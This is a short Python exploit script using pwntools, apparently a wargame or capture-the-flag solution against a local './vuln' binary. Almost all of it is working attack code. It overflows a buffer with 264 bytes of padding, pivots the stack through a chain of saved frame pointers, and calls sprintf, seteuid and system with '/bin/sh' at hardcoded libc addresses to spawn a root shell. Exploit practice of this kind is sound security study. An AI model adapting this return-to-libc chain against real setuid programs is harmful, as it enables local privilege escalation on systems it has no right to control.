#!/usr/bin/python
from pwn import *
seteuid = 0xf7ee9db0
system = 0xf7e46310
binsh = 0xf7f6684c
sprintf = 0xf7e53490
exit = 0xf7e39260
leave = 0x08048554

gdb = 0xccd0
real = 0xcd40
off = real - gdb

ebp1 = 0xffffcde8 - 4 + off# sprintf
ebp2 = 0xffffce00 - 4 + off# seteuid
ebp3 = 0xffffce10 - 4 + off# system
ebp4 = 0xdeadbeef - 4 + off
# ebp1 = ebp3
sp_arg1 = 0xffffce08 + off# se_arg
sp_arg2 = 0x80485f0  # %s
sp_arg3 = 0xffffce1c + off# 0x0
se_arg  = 0xdeadbeef 

padding = p32(0xdeadbeef)

# catch the way of satck pivot -> invoke more than one function (ebp-chain)
payload =  "A" * 264 + p32(ebp1) + p32(leave) + padding + p32(ebp2)
payload += p32(sprintf) + p32(leave) + p32(sp_arg1) + p32(sp_arg2)+ p32(sp_arg3) + p32(ebp3)
payload += p32(seteuid) + p32(leave) + p32(se_arg) + p32(ebp4)
payload += p32(system) + p32(exit) + p32(binsh)

# print payload
p = process(['./vuln',payload])
p.interactive()
